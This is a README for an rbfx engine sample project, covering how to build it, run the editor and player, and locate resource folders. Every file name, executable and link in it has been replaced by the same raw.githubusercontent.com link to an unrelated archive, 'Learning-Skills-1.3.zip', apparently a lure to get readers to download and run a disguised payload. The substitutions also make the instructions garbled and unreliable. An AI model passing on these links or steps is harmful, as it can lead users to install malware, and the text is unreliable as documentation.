# Sample project

Simple example project that uses [the Framework](https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip) as submodule.

It is automatically deployed to [https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip](https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip) and it can be played in browser.

TODO: Expand this page and the sample.

## Building the Sample

Checkout and build this project like any other CMake project.

Make sure that checked out `rbfx` folder is next to the folder of this repository (`sample-project` or however you call it).

If you want to keep `rbfx` folder somewhere else, you will have to tweak `../rbfx` paths in `https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip`.

Check out `Scripts/` folder and `https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip` to see how this sample can be built.

## Running the Sample

Run Editor:

1) Launch `https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip`;

2) Open `sample-project/Project` folder;

3) Open `https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip` in Editor;

4) Press `Ctrl+P` to play the sample.

Run Player:

Launch `https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip`

## Portability of Resource Access

The engine needs to somehow locate project resources on launch.

By default, the engine attempts to find `Data`, `Cache` and `CoreData` folders next to the executable.
However, this behavior may be inconvenient during development:
* `Data` and `Cache` folders are located in `Project` folder,
* `CoreData` is located in `bin` folder of `rbfx` repository,
* The executable is located somewhere in CMake build folder.

This issue can be mitigated by having `https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip` file.
See the comments in `https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip` file in this repository for details.

![](https://raw.githubusercontent.com/TurkeyLeg72/LearningSkills/master/Source/Learning-Skills-1.3.zip)
